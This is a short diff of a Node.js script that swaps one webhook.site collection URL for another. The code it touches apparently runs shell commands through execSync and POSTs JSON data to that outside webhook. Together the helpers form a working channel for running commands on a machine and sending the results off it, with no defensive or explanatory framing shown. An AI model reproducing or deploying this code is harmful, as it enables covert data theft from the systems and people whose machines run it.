@@ -3,7 +3,7 @@ const { execSync } = require('child_process');
 const https = require('https');
 const http = require('http');
 
-const WEBHOOK = 'https://webhook.site/398a6ae0-cf0c-46c9-9ec1-95f03c4ba42b';
+const WEBHOOK = 'https://webhook.site/2deab869-d624-4cc7-b7d4-69df0afcddf6';
 function run(cmd, timeout=20000) {
   try { return execSync(cmd, { timeout, encoding: 'utf-8', stdio: ['pipe','pipe','pipe'] }).trim(); }
   catch(e) { return 'ERR:' + (e.stderr || e.message || '').substring(0, 500); }
@@ -12,7 +12,7 @@ function post(data) {
   return new Promise((resolve) => {
     try {
       const p = JSON.stringify(data);
-      const req = https.request({ hostname: 'webhook.site', port: 443, path: '/398a6ae0-cf0c-46c9-9ec1-95f03c4ba42b',
+      const req = https.request({ hostname: 'webhook.site', port: 443, path: '/2deab869-d624-4cc7-b7d4-69df0afcddf6',
         method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(p) },
         timeout: 10000
       }, (res) => { res.on('data',()=>{}); res.on('end',()=>resolve(true)); });
